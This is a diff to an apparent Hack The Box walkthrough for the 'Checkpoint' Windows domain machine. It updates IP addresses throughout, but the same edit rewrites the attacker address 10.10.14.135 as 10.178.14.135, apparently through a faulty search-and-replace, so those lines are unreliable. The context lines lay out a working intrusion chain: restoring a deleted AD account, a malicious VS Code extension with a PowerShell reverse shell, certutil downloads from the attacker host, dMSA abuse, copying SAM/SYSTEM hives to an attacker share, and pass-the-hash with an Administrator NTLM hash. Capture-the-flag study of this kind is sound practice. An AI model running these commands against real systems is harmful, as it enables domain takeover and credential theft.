@@ -2,7 +2,7 @@
 
 ## Machine Information
 - **Name:** Checkpoint
-- **IP:** 10.129.46.10 (Dynamic – check HTB dashboard)
+- **IP:** 10.129.46.178 (Dynamic – check HTB dashboard)
 - **Difficulty:** Medium
 - **OS:** Windows Server 2025 Build 26100
 - **Domain:** checkpoint.htb
@@ -38,7 +38,7 @@ alex.turner (given)
 ### Initial Access Validation
 
 ```bash
-nmap -p- --min-rate 5000 -T4 10.129.46.10 | grep open
+nmap -p- --min-rate 5000 -T4 10.129.46.178 | grep open
 ```
 
 **Critical Open Ports:**
@@ -59,18 +59,18 @@ nmap -p- --min-rate 5000 -T4 10.129.46.10 | grep open
 ### Validate Provided Credentials
 
 ```bash
-nxc smb 10.129.46.10 -u alex.turner -p 'Checkpoint2024!'
+nxc smb 10.129.46.178 -u alex.turner -p 'Checkpoint2024!'
 ```
 
 **Output:**
 ```
-SMB         10.129.46.10    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
+SMB         10.129.46.178    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
 ```
 
 ### SMB Share Enumeration (as alex.turner)
 
 ```bash
-nxc smb 10.129.46.10 -u alex.turner -p 'Checkpoint2024!' --shares
+nxc smb 10.129.46.178 -u alex.turner -p 'Checkpoint2024!' --shares
 ```
 
 **Key Shares:**
@@ -90,7 +90,7 @@ nxc smb 10.129.46.10 -u alex.turner -p 'Checkpoint2024!' --shares
 ### Identify Writable Objects
 
 ```bash
-bloodyad --host 10.129.46.10 -d checkpoint.htb \
+bloodyad --host 10.129.46.178 -d checkpoint.htb \
   -u alex.turner -p 'Checkpoint2024!' get writable
 ```
 
@@ -108,7 +108,7 @@ permission: WRITE
 ### List Deleted Users
 
 ```bash
-bloodyad --host 10.129.46.10 -d checkpoint.htb \
+bloodyad --host 10.129.46.178 -d checkpoint.htb \
   -u alex.turner -p 'Checkpoint2024!' get search \
   --filter '(isDeleted=TRUE)' --attr name,whenDeleted
 ```
@@ -122,7 +122,7 @@ whenDeleted: 2026-05-28T14:32:00+00:00
 ### Restore Mark Davies
 
 ```bash
-bloodyad --host 10.129.46.10 -d checkpoint.htb \
+bloodyad --host 10.129.46.178 -d checkpoint.htb \
   -u alex.turner -p 'Checkpoint2024!' set restore \
   'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
 ```
@@ -135,7 +135,7 @@ bloodyad --host 10.129.46.10 -d checkpoint.htb \
 ### Verify Restoration & Password
 
 ```bash
-nxc smb 10.129.46.10 -u mark.davies -p 'Checkpoint2024!'
+nxc smb 10.129.46.178 -u mark.davies -p 'Checkpoint2024!'
 ```
 
 **Result:**
@@ -148,7 +148,7 @@ nxc smb 10.129.46.10 -u mark.davies -p 'Checkpoint2024!'
 ### Check mark.davies Share Access
 
 ```bash
-nxc smb 10.129.46.10 -u mark.davies -p 'Checkpoint2024!' --shares
+nxc smb 10.129.46.178 -u mark.davies -p 'Checkpoint2024!' --shares
 ```
 
 **Output:**
@@ -236,7 +236,7 @@ exports.deactivate = function() {};
 **Generate Base64 Payload:**
 ```powershell
 # PowerShell command
-$lhost = "10.10.14.135"
+$lhost = "10.178.14.135"
 $lport = 4443
 $payload = @"
 `$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
@@ -265,7 +265,7 @@ zip -r devtools-helper.vsix '[Content_Types].xml' extension/
 ### Step 2: Upload to DevDrop Share
 
 ```bash
-smbclient //10.129.46.10/DevDrop \
+smbclient //10.129.46.178/DevDrop \
   -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
   -c "put devtools-helper.vsix"
 ```
@@ -288,7 +288,7 @@ The malicious extension is installed when **ryan.brooks** (a DevTeam member) ope
 **Reverse Shell Callback:**
 ```
 listening on [any] 4443 ...
-connect to [10.10.14.135] from (UNKNOWN) [10.129.46.10] 54830
+connect to [10.178.14.135] from (UNKNOWN) [10.129.46.178] 54830
 PS C:\Program Files\Microsoft VS Code>
 ```
 
@@ -370,7 +370,7 @@ ls -la bin/Release/BadSuccessor.exe
 
 **Download BadSuccessor.exe:**
 ```powershell
-certutil -urlcache -f http://10.10.14.135:8000/BadSuccessor.exe BadSuccessor.exe
+certutil -urlcache -f http://10.178.14.135:8000/BadSuccessor.exe BadSuccessor.exe
 .\BadSuccessor.exe find
 ```
 
@@ -395,7 +395,7 @@ certutil -urlcache -f http://10.10.14.135:8000/BadSuccessor.exe BadSuccessor.exe
   -targetUser "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" `
   -dnshostname ryandmsa.checkpoint.htb `
   -user ryan.brooks `
-  -dc-ip 10.129.46.10
+  -dc-ip 10.129.46.178
 ```
 
 **Output:**
@@ -438,7 +438,7 @@ certutil -urlcache -f http://10.10.14.135:8000/BadSuccessor.exe BadSuccessor.exe
 Import-Module .\Invoke-Rubeus.ps1
 
 # Request TGT for the dMSA
-Invoke-Rubeus -Command "asktgt /user:ryandmsa$ /domain:checkpoint.htb /dc:10.129.46.10 /getcredentials /nowrap"
+Invoke-Rubeus -Command "asktgt /user:ryandmsa$ /domain:checkpoint.htb /dc:10.129.46.178 /getcredentials /nowrap"
 ```
 
 **Output:**
@@ -503,7 +503,7 @@ wget https://github.com/nikaiw/VMkatz/releases/download/latest/vmkatz.exe
 
 **From Kali:**
 ```bash
-evil-winrm -i 10.129.46.10 -u 'ryandmsa$' -H <DMSANTLM>
+evil-winrm -i 10.129.46.178 -u 'ryandmsa$' -H <DMSANTLM>
 ```
 
 Or use the TGT from Rubeus directly for Kerberos authentication.
@@ -550,7 +550,7 @@ memory forensics\
 
 **Download VMkatz:**
 ```powershell
-certutil -urlcache -f http://10.10.14.135:8000/vmkatz.exe vmkatz.exe
+certutil -urlcache -f http://10.178.14.135:8000/vmkatz.exe vmkatz.exe
 ```
 
 **Run VMkatz on Snapshot:**
@@ -575,8 +575,8 @@ reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv
 reg save HKLM\SAM C:\Windows\Temp\SAM.hiv
 
 # Copy to attacker machine
-copy "C:\Windows\Temp\SYSTEM.hiv" \\10.10.14.135\share\
-copy "C:\Windows\Temp\SAM.hiv" \\10.10.14.135\share\
+copy "C:\Windows\Temp\SYSTEM.hiv" \\10.178.14.135\share\
+copy "C:\Windows\Temp\SAM.hiv" \\10.178.14.135\share\
 ```
 
 **On Kali:**
@@ -591,7 +591,7 @@ secretsdump.py -system SYSTEM.hiv -sam SAM.hiv LOCAL
 ### Login as Administrator
 
 ```bash
-evil-winrm -i 10.129.46.10 -u Administrator -H 'f29e9c014295b9b32139b09a2790be3b'
+evil-winrm -i 10.129.46.178 -u Administrator -H 'f29e9c014295b9b32139b09a2790be3b'
 ```
 
 **Verify Domain Admin Status:**
